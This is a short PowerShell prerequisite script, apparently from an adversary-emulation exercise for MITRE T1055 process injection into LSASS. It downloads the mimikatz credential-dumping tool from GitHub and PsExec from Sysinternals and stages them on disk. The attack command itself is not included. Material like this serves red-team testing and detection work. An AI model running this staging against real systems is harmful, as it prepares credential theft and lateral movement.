# By Threats Experts University
# Technique: T1055 - Process Injection
# Task: Remote Process Injection in LSASS via mimikatz
# Note: This is pre-requisite before executing the attack command on command prompt (see documentation for instructions)

$mimikatz_path = cmd /c echo %tmp%\mimikatz\x64\mimikatz.exe
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
New-Item -ItemType Directory (Split-Path "C:\PSTools\PsExec.exe") -Force | Out-Null
Copy-Item $env:TEMP\PsTools\PsExec.exe "C:\PSTools\PsExec.exe" -Force

